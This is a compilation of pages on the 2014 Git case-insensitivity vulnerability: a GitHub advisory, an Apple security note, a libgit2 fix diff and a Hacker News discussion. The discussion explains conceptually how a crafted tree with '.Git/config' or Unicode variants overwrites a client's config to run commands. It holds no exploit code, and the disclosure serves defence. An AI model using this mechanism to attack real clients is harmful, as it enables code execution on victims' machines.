[Home](https://github.blog/) / [Security](https://github.blog/security/) / [Supply chain security](https://github.blog/security/supply-chain-security/)
# Vulnerability announced: update your Git clients

A critical Git security vulnerability has been announced today, affecting all versions of the official Git client and all related software that interacts with Git repositories, including GitHub for Windows…

[Vicent Martí](https://github.blog/author/vmg/ "Posts by Vicent Martí")·[@vmg](https://github.com/vmg)

December 18, 2014
|
Updated January 4, 2019
|

2 minutes

* Share:

A [critical Git security vulnerability has been announced today](http://article.gmane.org/gmane.linux.kernel/1853266), affecting all versions of the official Git client and all related software that interacts with Git repositories, including GitHub for Windows and GitHub for Mac. Because this is a client-side only vulnerability, `github.com` and GitHub Enterprise are not directly affected.

The vulnerability concerns Git and Git-compatible clients that access Git repositories in a case-insensitive or case-normalizing filesystem. An attacker can craft a malicious Git tree that will cause Git to overwrite its own `.git/config` file when cloning or checking out a repository, leading to arbitrary command execution in the client machine. Git clients running on OS X (HFS+) or any version of Microsoft Windows (NTFS, FAT) are exploitable through this vulnerability. Linux clients are not affected if they run in a case-sensitive filesystem.

**We strongly encourage all users of GitHub and GitHub Enterprise to update their Git clients as soon as possible**, and to be particularly careful when cloning or accessing Git repositories hosted on unsafe or untrusted hosts.

Repositories hosted on `github.com` cannot contain any of the malicious trees that trigger the vulnerability because we now verify and block these trees on push. We have also completed an automated scan of all existing content on `github.com` to look for malicious content that might have been pushed to our site before this vulnerability was discovered. This work is an extension of the data-quality checks we have always performed on repositories pushed to our servers to protect our users against malformed or malicious Git data.

Updated versions of [GitHub for Windows](https://windows.github.com/) and [GitHub for Mac](https://mac.github.com/) are available for immediate download, and both contain the security fix on the Desktop application itself *and* on the bundled version of the Git command-line client.

In addition, the following updated versions of Git address this vulnerability:

* The Git core team [has announced maintenance releases](https://www.kernel.org/pub/software/scm/git/) for all current versions of Git (v1.8.5.6, v1.9.5, v2.0.5, v2.1.4, and v2.2.1).
* [Git for Windows](https://msysgit.github.io/) (also known as MSysGit) has released maintenance version 1.9.5.
* The two major Git libraries, [libgit2](https://github.com/libgit2/libgit2/) and [JGit](https://eclipse.org/jgit/), have released maintenance versions with the fix. Third party software using these libraries is strongly encouraged to update.

More details on the vulnerability can be found in the [official Git mailing list announcement](http://article.gmane.org/gmane.linux.kernel/1853266) and on the [`git-blame` blog](http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html).

## Written by

![Vicent Martí](https://avatars1.githubusercontent.com/u/42793?v=4&s=200)

### [Vicent Martí](https://github.blog/author/vmg/)

[@vmg](https://github.com/vmg)

## Related posts

![](https://github.blog/wp-content/uploads/2023/12/Security-DarkMode-1-2.png?resize=400%2C212)
[Security](https://github.blog/security/)
### [Attacks on Maven proxy repositories](https://github.blog/security/vulnerability-research/attacks-on-maven-proxy-repositories/)

Learn how specially crafted artifacts can be used to attack Maven repository managers. This post describes PoC exploits that can lead to pre-auth remote code execution and poisoning of the local artifacts in Sonatype Nexus and JFrog Artifactory.

[Michael Stepankin](https://github.blog/author/artsploit/ "Posts by Michael Stepankin")

![](https://github.blog/wp-content/uploads/2023/12/Security-DarkMode-1.png?resize=400%2C212)
[Application security](https://github.blog/security/application-security/)
### [How to secure your GitHub Actions workflows with CodeQL](https://github.blog/security/application-security/how-to-secure-your-github-actions-workflows-with-codeql/)

In the last few months, we secured 75+ GitHub Actions workflows in open source projects, disclosing 90+ different vulnerabilities. Out of this research we produced new support for workflows in CodeQL, empowering you to secure yours.

[Alvaro Munoz](https://github.blog/author/pwntester/ "Posts by Alvaro Munoz")

![](https://github.blog/wp-content/uploads/2024/01/Security-DarkMode-1.png?resize=400%2C212)
[Security](https://github.blog/security/)
### [Announcing CodeQL Community Packs](https://github.blog/security/vulnerability-research/announcing-codeql-community-packs/)

We are excited to introduce the new CodeQL Community Packs, a comprehensive set of queries and models designed to enhance your code analysis capabilities. These packs are tailored to augment…

[Alvaro Munoz](https://github.blog/author/pwntester/ "Posts by Alvaro Munoz")

## Explore more from GitHub

![Docs](https://github.blog/wp-content/uploads/2024/07/Icon-Circle.svg)
### Docs

Everything you need to master GitHub, all in one place.

[Go to Docs](https://docs.github.com/)

![GitHub](https://github.blog/wp-content/uploads/2024/07/Icon_95220f.svg)
### GitHub

Build what’s next on GitHub, the place for anyone from anywhere to build anything.

[Start building](https://github.blog/developer-skills/github/)

![Customer stories](https://github.blog/wp-content/uploads/2024/07/Icon_da43dc.svg)
### Customer stories

Meet the companies and engineering teams that build with GitHub.

[Learn more](https://github.com/customer-stories)

![Work at GitHub!](https://github.blog/wp-content/uploads/2022/05/careers.svg)
### Work at GitHub!

Check out our current job openings.

[Apply now](https://www.github.careers/careers-home)

## We do newsletters, too

Discover tips, technical guides, and best practices in our biweekly newsletter just for devs.

Your email address

Subscribe

Yes please, I’d like GitHub and affiliates to use my information for personalized communications, targeted advertising and campaign effectiveness. See the [GitHub Privacy Statement](https://github.com/site/privacy) for more details.

Subscribe

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Enterprise](https://github.com/enterprise)
* [Customer Stories](https://github.com/customer-stories?type=enterprise)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com/)
## Platform

* [Developer API](https://developer.github.com/)
* [Partners](https://partner.github.com/)
* [Atom](https://atom.io/)
* [Electron](https://www.electronjs.org/)
* [GitHub Desktop](https://desktop.github.com/)
## Support

* [Docs](https://docs.github.com/)
* [Community Forum](https://github.community/)
* [Training](https://services.github.com/)
* [Status](https://www.githubstatus.com/)
* [Contact](https://support.github.com/)
## Company

* [About](https://github.com/about)
* [Blog](https://github.blog/)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Shop](https://shop.github.com/)

* [LinkedIn icon

  GitHub on LinkedIn](https://www.linkedin.com/company/github)
* [Instagram icon

  GitHub on Instagram](https://www.instagram.com/github/)
* [YouTube icon

  GitHub on YouTube](https://www.youtube.com/github)
* [X icon

  GitHub on X](https://twitter.com/github)
* [TikTok icon

  GitHub on TikTok](https://www.tiktok.com/%40github)
* [Twitch icon

  GitHub on Twitch](https://www.twitch.tv/github)
* [GitHub icon

  GitHub’s organization on GitHub](https://github.com/github)

* © 2025 GitHub, Inc.
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Manage Cookies
* Do not share my personal information



=== Content from msysgit.github.io_38fba671_20250126_074647.html ===

![](http://git-for-windows.github.io/img/gwindows_logo.png)
# Redirecting to the Git for Windows homepage

If you are not redirected automatically, please click [here](https://git-for-windows.github.io/).


=== Content from support.apple.com_7eb78389_20250125_092515.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of Xcode 6.2 beta 3

This document describes the security content of Xcode 6.2 beta 3.

For the protection of our customers, Apple does not disclose, discuss, or confirm security issues until a full investigation has occurred and any necessary patches or releases are available. To learn more about Apple Product Security, see the [Apple Product Security](http://www.apple.com/support/security/) website.

For information about the Apple Product Security PGP Key, see [How to use the Apple Product Security PGP Key](http://support.apple.com/kb/HT1620).

Where possible, [CVE IDs](http://cve.mitre.org/about/) are used to reference the vulnerabilities for further information.

To learn about other Security Updates, see [Apple Security Updates](http://support.apple.com/kb/HT1222).

## Xcode 6.2 beta 3

* **Git**

  Available for: OS X Mavericks v10.9.4 or later

  Impact: Synching with a malicious git repository may allow unexpected files to be added to the .git folder

  Description: The checks involved in disallowed paths did not account for case insensitivity or unicode characters. This issue was addressed by adding additional checks.

  CVE-ID

  CVE-2014-9390 : Matt Mackall of Mercurial and Augie Fackler of Mercurial

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 06, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of Xcode 6.2 beta 3

[United States](https://support.apple.com/en-us/103321/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from github.com_3182bf14_20250125_092518.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flibgit2%2Flibgit2%2Fcommit%2F928429c5c96a701bcbcafacb2421a82602b36915)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flibgit2%2Flibgit2%2Fcommit%2F928429c5c96a701bcbcafacb2421a82602b36915)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=libgit2%2Flibgit2)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[libgit2](/libgit2)
/
**[libgit2](/libgit2/libgit2)**
Public

* [Notifications](/login?return_to=%2Flibgit2%2Flibgit2) You must be signed in to change notification settings
* [Fork
  2.4k](/login?return_to=%2Flibgit2%2Flibgit2)
* [Star
   9.8k](/login?return_to=%2Flibgit2%2Flibgit2)

* [Code](/libgit2/libgit2)
* [Issues
  356](/libgit2/libgit2/issues)
* [Pull requests
  88](/libgit2/libgit2/pulls)
* [Discussions](/libgit2/libgit2/discussions)
* [Actions](/libgit2/libgit2/actions)
* [Projects
  0](/libgit2/libgit2/projects)
* [Security](/libgit2/libgit2/security)
* [Insights](/libgit2/libgit2/pulse)

Additional navigation options

* [Code](/libgit2/libgit2)
* [Issues](/libgit2/libgit2/issues)
* [Pull requests](/libgit2/libgit2/pulls)
* [Discussions](/libgit2/libgit2/discussions)
* [Actions](/libgit2/libgit2/actions)
* [Projects](/libgit2/libgit2/projects)
* [Security](/libgit2/libgit2/security)
* [Insights](/libgit2/libgit2/pulse)

## Commit

[Permalink](/libgit2/libgit2/commit/928429c5c96a701bcbcafacb2421a82602b36915)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

tree: Check for `.git` with case insensitivy

[Browse files](/libgit2/libgit2/tree/928429c5c96a701bcbcafacb2421a82602b36915)
Browse the repository at this point in the history

* Loading branch information

[![@vmg](https://avatars.githubusercontent.com/u/42793?s=40&v=4)](/vmg)

[vmg](/libgit2/libgit2/commits?author=vmg "View all commits by vmg")
authored and
Edward Thomson
committed
Dec 17, 2014

1 parent
[09361df](/libgit2/libgit2/commit/09361dfe7b3206c9e2edd975ed71f1b74cd22ede)

commit 928429c

Showing
**1 changed file**
with
**1 addition**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[src/tree.c](#diff-fe0ef4e9d2cca13622a45455b6210a1783e7cc3088f9e443203e4883b1b66ceb "src/tree.c")

Show comments

[View file](/libgit2/libgit2/blob/928429c5c96a701bcbcafacb2421a82602b36915/src/tree.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -55,7 +55,7 @@ static int valid\_entry\_name(const char \*filename) |
|  |  | (\*filename != '.' || |
|  |  | (strcmp(filename, ".") != 0 && |
|  |  | strcmp(filename, "..") != 0 && |
|  |  | strcmp(filename, DOT\_GIT) != 0)); |
|  |  | strcasecmp(filename, DOT\_GIT) != 0)); |
|  |  | } |
|  |  |  |
|  |  | static int entry\_sort\_cmp(const void \*a, const void \*b) |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `928429c`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flibgit2%2Flibgit2%2Fcommit%2F928429c5c96a701bcbcafacb2421a82602b36915) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from news.ycombinator.com_ac0ee796_20250125_092521.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D8769667) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Git client vulnerability announced](https://github.com/blog/1938-git-client-vulnerability-announced) ([github.com/blog](from?site=github.com/blog)) | | --- | --- | --- | |  | | 818 points by [polemic](user?id=polemic) [on Dec 18, 2014](item?id=8769667)  | [hide](hide?id=8769667&goto=item%3Fid%3D8769667) | [past](https://hn.algolia.com/?query=Git%20client%20vulnerability%20announced&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=8769667&auth=66531df1b9ed1752a507274e7d9e3d46aa26fff2) | [177 comments](item?id=8769667) |  | |  |  | [FiloSottile](user?id=FiloSottile) [on Dec 18, 2014](item?id=8769749)   | [next](#8770756) [–]  Short panic summary: your git/hg remotes can get code execution on your machine when you clone/pull if you are on OSX or Windows. Summary: on case-insensitive/normalizing filesystems (default on OSX and Windows) it's possible for .git/config to be overwritten by the tree, probably due to a case-sensitive sanity check when the actual file is insensitive. .git/config can contain arbitrary commands to be run on certain events/as aliases, so it leads to code execution. This is a risk when you get a tree from a third party, so on pull/fetch+checkout/clone... There's an analogous vulnerability in Mercurial. Update, then run git --version and make sure it's one of v1.8.5.6, v1.9.5, v2.0.5, v2.1.4, or v2.2.1. And be careful when pulling/cloning from third-parties. EDIT: right, no "or", what are you doing reading this instead of updating? | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [yincrash](user?id=yincrash) [on Dec 18, 2014](item?id=8770094)   | [parent](#8769749) | [next](#8770405) [–]  Yes, the actual vulnerability is that you can commit .Git/config or .gIt/config etc., and on case insensitive filesystem, checking that out will overwrite .git/config. | | --- | --- | --- | | | |  |  | [prawks](user?id=prawks) [on Dec 18, 2014](item?id=8770405)   | [parent](#8769749) | [prev](#8770094) | [next](#8769757) [–]  For those wondering about the analogous vulnerability in Mercurial, the patch notes are out for a fix: [http://mercurial.selenic.com/wiki/WhatsNew#Mercurial\_3.2.3\_....](http://mercurial.selenic.com/wiki/WhatsNew#Mercurial_3.2.3_.282014-12-18.29) You'll need 3.2.3 to be secure. | | --- | --- | --- | | | |  |  | [tptacek](user?id=tptacek) [on Dec 18, 2014](item?id=8769757)   | [parent](#8769749) | [prev](#8770405) | [next](#8771835) [–]  Lose the /or. Update no matter what. | | --- | --- | --- | | | |  |  | [fizzbatter](user?id=fizzbatter) [on Dec 18, 2014](item?id=8770054)   | [root](#8769749) | [parent](#8769757) | [next](#8771835) [–]  Well, to be clear, this only affects Mac and Windows, correct? (Technically any case changing os) So, update no matter what, *unless* you're not on an affected system? (this is a question, not a statement) | | --- | --- | --- | | | |  |  | [keeperofdakeys](user?id=keeperofdakeys) [on Dec 18, 2014](item?id=8770132)   | [root](#8769749) | [parent](#8770054) | [next](#8770392) [–]  As mentioned in the mailing list announcement (<http://article.gmane.org/gmane.linux.kernel/1853266>), if you run a git host on linux, you can still spread the dangerous commit. | | --- | --- | --- | | | |  |  | [cbd1984](user?id=cbd1984) [on Dec 18, 2014](item?id=8770392)   | [root](#8769749) | [parent](#8770054) | [prev](#8770132) | [next](#8770153) [–]  OK, just so everyone is up to speed: Under what circumstances could a Linux filesystem be case-insensitive? I know of three: FAT (specifically vfat, these days), JFS with Option -O, and CIOPFS (Case Insensitive On Purpose Filesystem): [http://superuser.com/questions/290480/case-insensitive-parti...](http://superuser.com/questions/290480/case-insensitive-partition-under-linux) <http://linux.die.net/man/8/mkfs.jfs> [http://manpages.ubuntu.com/manpages/hardy/man8/jfs\_mkfs.8.ht...](http://manpages.ubuntu.com/manpages/hardy/man8/jfs_mkfs.8.html) <http://www.brain-dump.org/projects/ciopfs/> Are there any more? | | --- | --- | --- | | | |  |  | [ethomson](user?id=ethomson) [on Dec 19, 2014](item?id=8770526)   | [root](#8769749) | [parent](#8770392) | [next](#8770629) [–]  As for common filesystems (for some reasonable value of "common"): NTFS, HFS+ and SMB will probably be case insensitive. ZFS *may* be case insensitive. There are others that would be exotic these days, like AFP. And with FUSE, could be anything. | | --- | --- | --- | | | |  |  | [SSLy](user?id=SSLy) [on Dec 19, 2014](item?id=8770672)   | [root](#8769749) | [parent](#8770526) | [next](#8771119) [–]  My quick an dirty (pun intended) experiment concluded that ntfs, while mounted on linux, is case-sensitive. Windows will happily list all files from fs in explorer, whatever case they are, but treat them as one. And this is deep in win32: <http://i.imgur.com/sWnCMdq.png> (that's cygwin, while on linux, I've put a `small` file in the `test` dir). | | --- | --- | --- | | | |  |  | [ethomson](user?id=ethomson) [on Dec 19, 2014](item?id=8770862)   | [root](#8769749) | [parent](#8770672) | [next](#8771021) [–]  You can mount NTFS case sensitive, but you probably don't want case sensitivity if you interop with Windows and, if you don't, why on earth would you use NTFS? | | --- | --- | --- | | | |  |  | [hoov](user?id=hoov) [on Dec 19, 2014](item?id=8771010)   | [root](#8769749) | [parent](#8770862) | [next](#8771021) [–]  Yeah. NTFS is case preserving, not case sensitive. | | --- | --- | --- | | | |  |  | [barrkel](user?id=barrkel) [on Dec 19, 2014](item?id=8771634)   | [root](#8769749) | [parent](#8771010) | [next](#8771021) [–]  NTFS is case sensitive. The Win32 layer presents NTFS as case preserving, but the NT POSIX layer (since renamed to SFU), as well as Cygwin, use NTFS's case sensitivity. | | --- | --- | --- | | | |  |  | [ygra](user?id=ygra) [on Dec 19, 2014](item?id=8771831)   | [root](#8769749) | [parent](#8771634) | [next](#8771021) [–]  More to the point, the NTFS API can be both. And you can access that from Win32 code as well. There's also a registry flag to make NTFS case-sensitive by default. | | --- | --- | --- | | | |  |  | [im3w1l](user?id=im3w1l) [on Dec 19, 2014](item?id=8771021)   | [root](#8769749) | [parent](#8770672) | [prev](#8770862) | [next](#8771119) [–]  Anyone knows what happens if an NTFS partition has both fiLe and file, when used in windows? | | --- | --- | --- | | | |  |  | [gizmo686](user?id=gizmo686) [on Dec 19, 2014](item?id=8771291)   | [root](#8769749) | [parent](#8771021) | [next](#8771119) [–]  I just quickly tested this on Windows 7. It showed both a directory for both spelling, but both of them contained the same content corresponding to one of the two directories. | | --- | --- | --- | | | |  |  | [mitchty](user?id=mitchty) [on Dec 19, 2014](item?id=8771119)   | [root](#8769749) | [parent](#8770526) | [prev](#8770672) | [next](#8770629) [–]  Re zfs, you have to turn case insensitivity off if you want it. The default is case sensitive. That is: $ zfs get casesensitivity zroot NAME PROPERTY VALUE SOURCE zroot casesensitivity sensitive - Is what you want in general. Unless you have some reason not to be, in which case you have to worry about the bug. | | --- | --- | --- | | | |  |  | [gklitt](user?id=gklitt) [on Dec 19, 2014](item?id=8770629)   | [root](#8769749) | [parent](#8770392) | [prev](#8770526) | [next](#8770153) [–]  Probably a fairly common case: I use git on a Linux VM running in a Mac OS X host machine, using an NFS synced folder to share files between the host and guest. It appears that in this case the guest machine uses the case insensitivity of the host file system, making git vulnerable even though it's running on Linux. | | --- | --- | --- | | | |  |  | [sp332](user?id=sp332) [on Dec 18, 2014](item?id=8770153)   | [root](#8769749) | [parent](#8770054) | [prev](#8770392) | [next](#8771835) [–]  Or Linux mounting a case-insensitive share, e.g. CIFS. | | --- | --- | --- | | | |  |  | [Someone](user?id=Someone) [on Dec 19, 2014](item?id=8771835)   | [parent](#8769749) | [prev](#8769757) | [next](#8770020) [–]  So, I guess people are going through old web server vulnerabilities such as trying to masquerade ".git/config" as ".git/../.git/config" or using different encodings for the same file to see which ones git falls for? Also, can git run with .git/config being read only? That could be a useful second line of defense. | | --- | --- | --- | | | |  |  | [cheshire137](user?id=cheshire137) [on Dec 18, 2014](item?id=8770020)   | [parent](#8769749) | [prev](#8771835) | [next](#8772118) [–]  I just downloaded git from git-scm.org and I only got 2.0.1. :/ | | --- | --- | --- | | | |  |  | [kenperkins](user?id=kenperkins) [on Dec 19, 2014](item?id=8770528)   | [root](#8769749) | [parent](#8770020) | [next](#8772118) [–]  It's now available at [http://sourceforge.net/projects/git-osx-installer/files/late...](http://sourceforge.net/projects/git-osx-installer/files/latest/download) | | --- | --- | --- | | | |  |  | [aragot](user?id=aragot) [on Dec 19, 2014](item?id=8771447)   | [root](#8769749) | [parent](#8770528) | [next](#8772118) [–]  Why SourceForge? Since they changed investors a few years ago, I thought SourceForge now added spameare to installers, such as the Ask toolbar for example? | | --- | --- | --- | | | |  |  | [bhaak](user?id=bhaak) [on Dec 19, 2014](item?id=8771517)   | [root](#8769749) | [parent](#8771447) | [next](#8772118) [–]  It's opt-in. The spamware doesn't get added automatically, you as a project admin need to enable this. | | --- | --- | --- | | | |  |  | [raydev](user?id=raydev) [on Dec 19, 2014](item?id=8772118)   | [parent](#8769749) | [prev](#8770020) | [next](#8770058) [–]  Hmm. I have git 2.2.0 installed through Homebrew, but the Homebrew repo seems broken at the moment? edit: Nevermind, short-lived issue. Just upgraded to 2.2.1. | | --- | --- | --- | | | |  |  | [jdkram](user?id=jdkram) [on Dec 19, 2014](item?id=8773390)   | [root](#8769749) | [parent](#8772118) | [next](#8770058) [–]  For anyone looking to update via Homebrew, make sure it has the latest formulae: ```   brew update   brew upgrade git ``` | | --- | --- | --- | | | |  |  | [e40](user?id=e40) [on Dec 18, 2014](item?id=8770058)   | [parent](#8769749) | [prev](#8772118) | [next](#8770756) [–]  Cygwin and Macports both have versions which are vulnerable. EDIT: Macports just updated. I did it with # port selfupdate # port upgrade outdated and 2.2.1 came down. If you have the Apple git, then you should # port install git | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [on Dec 19, 2014](item?id=8770756)   | [prev](#8769749) | [next](#8769755) [–]  I think here is a good argument for not using case-insensitive filesystems - because *every single filename comparison* gets affected and it can lead to vulnerabilities like this (I wonder what others are out there...) Case-insensitive initially feels like a good idea to some, but I think it's a good example of "trying to do too much" and often in subtle ways that even the user might not fully understand - the definition of "case" changes with locale, for instance. In contrast, with filenames that are treated as dumb and simple, plain sequences of bytes that just cannot contain certain characters (and thus compared accordingly for equality, bit-by-bit), there is no need to even consider the concept of "case", and no ambiguity: It either matches exactly or doesn't match. (I am aware of all the - quite frankly ridiculous - complexity of Unicode characters that are visually identical and "should be treated as such for the purposes of comparison", but I think that's another example of excess complexity leading to things like directory-traversal attacks.) | | --- | --- | --- | | | |  |  | [thedufer](user?id=thedufer) [on Dec 19, 2014](item?id=8770957)   | [parent](#8770756) | [next](#8771273) [–]  > Unicode characters that are visually identical This was actually a further bug, reported as part of the same CVE - you could also overwrite .git/config by adding any of a number of zero-width Unicode characters that many filesystems ignore when checking for filename equality (but string comparison doesn't, of course). | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [on Dec 19, 2014](item?id=8771212)   | [root](#8770756) | [parent](#8770957) | [next](#8771273) [–]  <http://en.m.wikipedia.org/wiki/Unicode_equivalence> <http://en.m.wikipedia.org/wiki/IDN_homograph_attack> What seems *really* scary about this is that even Unicode has several different ways of comparing strings, and the correct one depends on the exact situation, so the common response of "just use a library" doesn't work; for example, if a user were searching for a filename it might make sense for full-width characters to compare equal to half-width ones, but not if opening a file where you wouldn't want e.g. the full width version of /etc/passwd to be equivalent to the half-width one. | | --- | --- | --- | | | |  |  | [raydev](user?id=raydev) [on Dec 19, 2014](item?id=8772156)   | [root](#8770756) | [parent](#8771212) | [next](#8771273) [–]  I don't understand. Why can't a library just compare strings at the code-point level, ignoring "canonical equivalence"? | | --- | --- | --- | | | |  |  | [medgno](user?id=medgno) [on Dec 19, 2014](item?id=8772876)   | [root](#8770756) | [parent](#8772156) | [next](#8772260) [–]  Then you run into problems with how characters are represented. For instance, é (lowercase latin e with an acute accent) can be represented either by one unicode codepoint (U+00E9, 'LATIN SMALL LETTER E WITH ACUTE'), or by two unicode codepoints (U+0065 U+0301 -- LATIN SMALL LETTER E, COMBINING ACUTE ACCENT). There are normalization forms that will convert these two representations into the same representation for easier comparison. If you don't perform canonical equivalence checking, you could search for "café" and not find a file named "café.txt" if it uses the other representation. | | --- | --- | --- | | | |  |  | [oneeyedpigeon](user?id=oneeyedpigeon) [on Dec 19, 2014](item?id=8772260)   | [root](#8770756) | [parent](#8772156) | [prev](#8772876) | [next](#8771273) [–]  "for example, if a user were searching for a filename" It's useful when I search for "café", if I also get results for "cafe" - Chrome's search does this. Not to mention searching for "don't" and getting hits including "don’t". But that should definitely be restricted to text data operations, rather than lower-level ones, including filenames. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [on Dec 19, 2014](item?id=8772383)   | [root](#8770756) | [parent](#8772260) | [next](#8771273) [–]  *But that should definitely be restricted to text data operations, rather than lower-level ones, including filenames.* The issue arises when this "text data" includes filenames. Having café.txt and cafe.txt be equivalent when searching is useful, but the real problem is if a filesystem decides that two "equivalent" filenames are essentially identical - to contrive an example, suppose it thought /étc/passwd was referring to the same file as /etc/passwd . It makes checking for and filtering out "sensitive" filenames far more difficult. For example, just take a look at all the ways Unicode homoglyphs and "special" characters can be used to bypass forum wordfilters, and you'll see how difficult that problem is. (I know permissions, ACLs, etc. can help here with access control, but the problem of distinguishing between filenames still stands.) | | --- | --- | --- | | | |  |  | [shanemhansen](user?id=shanemhansen) [on Dec 19, 2014](item?id=8771273)   | [parent](#8770756) | [prev](#8770957) | [next](#8771854) [–]  Linus actually has a great rant about brain-dead filesystems that mangle people's data. It's eerily prescient. [http://thread.gmane.org/gmane.comp.version-control.git/70688...](http://thread.gmane.org/gmane.comp.version-control.git/70688/focus%3D71348) | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [on Dec 19, 2014](item?id=8771944)   | 